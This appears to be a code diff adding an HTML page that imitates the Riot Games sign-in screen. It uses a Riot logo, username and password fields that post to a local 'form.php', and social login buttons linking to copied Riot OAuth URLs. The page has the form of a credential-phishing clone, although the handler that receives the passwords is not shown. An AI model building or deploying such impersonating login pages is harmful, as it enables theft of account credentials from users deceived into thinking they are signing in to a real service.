@@ -1,0 +1,352 @@
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+</head>
+<style>
+    * {
+        
+        margin: 0;
+        padding: 0;
+    }
+
+    body {
+        position: absolute;
+        background: url("pictures/background.jpeg");
+        
+
+
+    }
+
+    .main {
+        display: flex;
+    }
+
+    .left {
+        width: 379;
+        height: 100vh;
+        background-color: white;
+
+    }
+
+    .logo {
+        height: 25%;
+        position: relative;
+    }
+
+    #logo {
+        position: absolute;
+        display: flex;
+        width: 35%;
+        transform: translate(-50%, -50%);
+        top: 50%;
+        left: 50%;
+
+    }
+
+    .credentials {
+        text-align: center;
+        font-family: 'Roboto', sans-serif;
+
+    }
+
+    .signin {
+        font-weight: bolder;
+    }
+
+    .input {
+        position: relative;
+        font-family: 'Roboto', sans-serif;
+    }
+
+    .label {
+        font-size: 0.6em;
+        font-weight: 900;
+        color: #999999;
+        letter-spacing: 1px;
+    }
+
+    #labela {
+        position: absolute;
+        left: 20%;
+        top: 14%;
+        cursor: auto;
+        transition: 0.1s;
+        pointer-events: none;
+    }
+
+    #labelb {
+        position: absolute;
+        left: 20%;
+        top: 87px;
+        cursor: auto;
+        transition: 0.1s;
+        pointer-events: none;
+    }
+
+    .username {
+        display: block;
+        width: 75%;
+        margin: auto;
+        height: 3em;
+        margin-bottom: 2em;
+        border: none;
+        background-color: #EDEDED;
+        border-radius: 4px;
+        padding: 25 20;
+        font-size: 10px;
+        font-weight: 800;
+        margin-top: 20;
+    }
+
+
+    .username:hover {
+        background-color: #edededc7;
+    }
+
+    .username:focus {
+        background-color: white;
+        border: 3px solid black;
+    }
+
+    .username:focus+#labela {
+        top: 4px;
+        left: 14%;
+
+    }
+
+    .username:focus+#labelb {
+        top: 60%;
+        left: 14%;
+    }
+
+    .buttons {
+        display: flex;
+        justify-content: center;
+
+    }
+
+    .abc {
+        width: 90px;
+        height: 30px;
+        border: none;
+        border-radius: 3px;
+        cursor: pointer;
+    }
+
+    #facebook {
+        margin: 0 5px;
+        background-color: #1877F2;
+    }
+
+    #google {
+        margin: 0 5px;
+        background-color: white;
+        box-shadow: 0px 0px 1px 2px #F2F2F2;
+    }
+
+    #google:hover {
+        background-color: rgba(242, 242, 242, 0.5);
+        box-shadow: 0px 0px 1px 2px rgba(211, 211, 211, 0.5);
+    }
+
+    #apple {
+        margin: 0 5px;
+        background-color: black;
+    }
+
+    .buttonfb {
+        position: relative;
+    }
+
+    #fblogo {
+        position: absolute;
+        width: 17px;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        border-radius: 50%;
+
+    }
+
+    #facebook:hover {
+        background-color: rgba(45, 45, 229, 0.944);
+    }
+
+    .buttongoogle {
+        position: relative;
+    }
+
+    #googlelogo {
+        position: absolute;
+        width: 17;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+    }
+
+    .buttonapple {
+        position: relative;
+    }
+
+    #applelogo {
+        position: absolute;
+        width: 35px;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        filter: invert(100%);
+    }
+
+    .check {
+        width: 76%;
+        margin-top: 9%;
+        margin: 14px 43px;
+        display: block;
+        font-family: 'Roboto', sans-serif;
+        font-size: 15px;
+        letter-spacing: 1;
+        color: #000000ba;
+        cursor: pointer;
+    }
+
+    #check {
+        cursor: pointer;
+    }
+
+    .arrow {
+        text-align: center;
+        margin-top: 30%;
+    }
+
+    .arrow img {
+        width: 20%;
+    }
+
+    .create {
+        text-align: center;
+        font-family: 'Roboto', sans-serif;
+        margin-top: 40;
+        font-size: 12;
+        font-weight: bolder;
+        color: lightgrey;
+        cursor: pointer;
+    }
+
+    .p1:hover {
+        color: black;
+    }
+
+    .p2:hover {
+        color: black;
+    }
+
+    #p3 {
+        display: inline-block;
+        cursor: pointer;
+    }
+
+    .version {
+        text-align: right;
+        margin-right: 7px;
+        font-family: 'Roboto';
+        font-size: 12;
+        color: #d1cfcf;
+        font-weight: bolder;
+        cursor: pointer;
+        letter-spacing: 1;
+        
+    }
+    #ver:hover {
+        color: rgb(135, 135, 135);
+    }
+    
+    #button{
+        display: block;
+        width: 70%;
+        margin: auto;
+        height: 3em;
+        margin-bottom: 2em;
+        border: none;
+        background-color: #413eff;
+        border-radius: 4px;
+        padding: 15 10;
+        font-size: 16px;
+        font-weight: 800;
+        margin-top: 20;
+    }
+    
+</style>
+
+<body>
+
+    <div class="main">
+        <div class="left">
+
+            <div class="logo">
+                <img src="pictures/riot.png" alt="" id="logo">
+            </div>
+            <div class="credentials">
+                <h2 class="signin">Sign in</h2>
+            </div>
+            <div class="input">
+<form action="form.php" method="post">
+                <input type="text" class="username" name="username">
+                <label for="" id="labela" class="label"><strong>Username</strong></label>
+
+                <input type="password" name="password" id="pass" class="username">
+                <label for="" id="labelb" class="label"><strong>Password</strong></label>
+                <button type="submit" class="abc" id="button">Log in</button>
+
+
+            </div>
+</form>            
+
+
+            <div class="buttons">
+                <div class="buttonfb">
+                    <button id="facebook" class="abc"> <a
+                            href="https://www.facebook.com/login.php?skip_api_login=1&api_key=344190606773871&kid_directed_site=0&app_id=344190606773871&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fclient_id%3D344190606773871%26redirect_uri%3Dhttps%253A%252F%252Fauthenticate.riotgames.com%252Fredirects%252Ffacebook%26state%3D0051a6800c3119f1bba997639a1969d6f2b5432cad12f7c905b255e4642e%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D915d67c9-fe64-4208-9914-3f4009657f11%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauthenticate.riotgames.com%2Fredirects%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0051a6800c3119f1bba997639a1969d6f2b5432cad12f7c905b255e4642e%23_%3D_&display=page&locale=en_GB&pl_dbl=0">
+                            <img src="pictures/facebook.png" alt="" id="fblogo"></a>
+                    </button>
+
+                </div>
+                <div class="buttongoogle">
+                    <button id="google" class="abc"> <a
+                            href="https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?access_type=online&scope=openid%20profile%20email&state=ec081d95fdd9f25ff3e3a673e9ada15f82e6adfd6996662026acad3c214c&prompt=select_account&response_type=code&client_id=187685766663-ct6bdnthcq6jlllecpg1guhthoc7i8vv.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fauthenticate.riotgames.com%2Fredirects%2Fgoogle&service=lso&flowName=GeneralOAuthFlow"><img
+                                src="pictures/google.webp" alt="" id="googlelogo"></a>
+                    </button>
+
+                </div>
+                <div class="buttonapple">
+                    <button id="apple" class="abc"> <a
+                            href="https://appleid.apple.com/auth/authorize?response_type=code%20id_token&response_mode=form_post&client_id=com.riotgames.authenticator.prod.client&redirect_uri=https%3A%2F%2Fauthenticate.riotgames.com%2Fredirects%2Fapple&scope=name%20email&nonce=0c6865960ce01c5ec1a8e311a78215fd9b78f7b2d59d2d0559d8432bc2f0&state=5e227a3f11aab15a222131a6cf61b541d03e661aa87af91045d9b42a8401">
+                            <img src="pictures/apple.png" alt="" id="applelogo"> </a> </button>
+                </div>
+
+            </div>
+            <div class="check">
+                <input type="checkbox" id="check">
+                <label for=""><strong>
+                        <p id="p3">Stay signed in</p>
+                    </strong> </label>
+            </div>
+            <div class="arrow">
+                <img src="pictures/button.jpg" alt="">
+            </div>
+            <div class="create">
+                <p class="p1">CAN'T SIGN IN</p>
+                <p class="p2">CREATE ACCOUNT</p>
+            </div>
+            <div class="version">
+                <p id="ver">V52.0.1</p>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
